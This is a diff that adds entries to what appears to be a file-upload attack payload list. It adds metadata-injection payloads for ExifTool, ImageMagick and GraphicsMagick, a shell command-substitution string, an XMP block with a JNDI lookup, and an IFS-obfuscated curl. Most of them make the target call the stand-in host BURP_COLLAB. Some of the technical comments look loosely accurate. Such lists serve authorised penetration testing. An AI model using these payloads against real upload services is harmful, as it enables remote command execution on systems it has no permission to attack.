@@ -38,3 +38,16 @@ shell.php%00.jpg
 system('id')
 text/html
 word/document.xml
+# ExifTool / ImageMagick metadata injection — reaches RCE without extension bypass
+# JSON body (multipart-form or JSON API) with newline-embedded shell in a metadata field:
+{"Title\n-if\nsystem('curl BURP_COLLAB')||1\n-Comment":"x"}
+# GraphicsMagick / MVG delegate — write PGM/SVG that opens |command
+push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 '|/bin/sh -c "curl BURP_COLLAB"'\npop graphic-context
+# ExifTool -stay_open via crafted control file argfile:
+-stay_open\nTrue\n-@\n|curl BURP_COLLAB
+# JFIF comment field with shell-quoted payload — often reflected in server logs / previews
+$(curl BURP_COLLAB)
+# XMP block — Adobe metadata parsers historically interpolate ${}
+<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description>${jndi:ldap://BURP_COLLAB/x}</rdf:Description></rdf:RDF></x:xmpmeta>
+# EXIF UserComment charset marker — some parsers eval() the value
+UNICODE\x00${IFS}curl${IFS}BURP_COLLAB
